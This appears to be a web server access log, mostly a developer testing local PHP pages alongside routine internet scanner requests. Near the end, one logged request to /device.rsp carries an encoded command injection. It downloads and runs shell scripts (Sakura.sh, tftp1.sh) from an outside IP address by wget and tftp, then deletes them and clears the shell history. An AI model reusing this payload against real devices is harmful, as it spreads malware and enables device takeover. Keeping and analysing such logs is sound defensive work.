127.0.0.1 - - [22/May/2025:22:02:34 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:02:34 +0900] "GET /favicon.ico HTTP/1.1" 404 555 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:03:39 +0900] "GET /entry.html HTTP/1.1" 200 16703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
184.105.139.69 - - [22/May/2025:22:03:44 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC2\x8Fx$\xCB,`0M\x8A\xCE\xEB?\xE5\xFD\xA3\xF8M\xCD#/\x93\xE5\xB2\x81\xD0W\xC4\xA03\x19o\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
89.42.231.140 - - [22/May/2025:22:04:40 +0900] "GET / HTTP/1.1" 200 615 "-" "Hello World/1.0"
204.76.203.206 - - [22/May/2025:22:05:15 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
127.0.0.1 - - [22/May/2025:22:22:17 +0900] "GET /php/entry.php HTTP/1.1" 200 16703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:25:38 +0900] "GET /php/test.html HTTP/1.1" 200 221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:35:27 +0900] "GET /php/test.php HTTP/1.1" 200 25 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:39:57 +0900] "GET /php/test.php HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:42:44 +0900] "GET /test.php HTTP/1.1" 200 25 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:43:29 +0900] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:43:36 +0900] "GET /test.php HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
204.76.203.212 - - [22/May/2025:22:45:57 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [22/May/2025:22:48:04 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
127.0.0.1 - - [22/May/2025:22:49:17 +0900] "GET /test.php HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:51:27 +0900] "GET /test.php HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:51:51 +0900] "GET /test.php HTTP/1.1" 200 25 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:22:59:52 +0900] "GET /test.php HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:01:12 +0900] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:01:13 +0900] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:01:13 +0900] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:01:14 +0900] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:02:42 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:03:40 +0900] "GET /test.php HTTP/1.1" 200 73777 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
180.149.126.5 - - [22/May/2025:23:07:58 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:10:42 +0900] "GET /entry.php HTTP/1.1" 200 16731 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:10:57 +0900] "GET /mainpage.html HTTP/1.1" 404 555 "http://127.0.0.1/entry.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:11:33 +0900] "GET /mainpage.php HTTP/1.1" 200 86039 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:11:34 +0900] "GET /api/placeholder/400/320 HTTP/1.1" 404 555 "http://127.0.0.1/mainpage.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:11:34 +0900] "GET /api/placeholder/40/40 HTTP/1.1" 404 555 "http://127.0.0.1/mainpage.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
89.42.231.140 - - [22/May/2025:23:11:45 +0900] "GET / HTTP/1.1" 403 153 "-" "Hello World/1.0"
127.0.0.1 - - [22/May/2025:23:13:54 +0900] "GET /html_/entry.html HTTP/1.1" 200 16703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
185.218.84.178 - - [22/May/2025:23:14:36 +0900] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
127.0.0.1 - - [22/May/2025:23:21:07 +0900] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:31:17 +0900] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:45:26 +0900] "GET /entry.php HTTP/1.1" 200 16730 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:45:26 +0900] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:45:27 +0900] "GET /surveypage.php HTTP/1.1" 200 49452 "http://127.0.0.1/entry.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:45:27 +0900] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:45:27 +0900] "GET /api/placeholder/400/320 HTTP/1.1" 404 555 "http://127.0.0.1/surveypage.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
204.76.203.206 - - [22/May/2025:23:53:07 +0900] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
127.0.0.1 - - [22/May/2025:23:56:56 +0900] "GET /surveypage.php HTTP/1.1" 200 49452 "http://127.0.0.1/entry.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:56:56 +0900] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
127.0.0.1 - - [22/May/2025:23:56:56 +0900] "GET /api/placeholder/400/320 HTTP/1.1" 404 555 "http://127.0.0.1/surveypage.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
204.76.203.219 - - [23/May/2025:00:19:33 +0900] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.121.124.143 - - [23/May/2025:00:24:57 +0900] "GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F146.103.53.37%2FSakura.sh%3B+chmod+777+%2A%3B+sh+Sakura.sh%3B+tftp+-g+146.103.53.37+-r+tftp1.sh%3B+chmod+777+%2A%3B+sh+tftp1.sh%3B+rm+-rf+%2A.sh%3B+history+-c HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
204.76.203.212 - - [23/May/2025:00:42:13 +0900] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
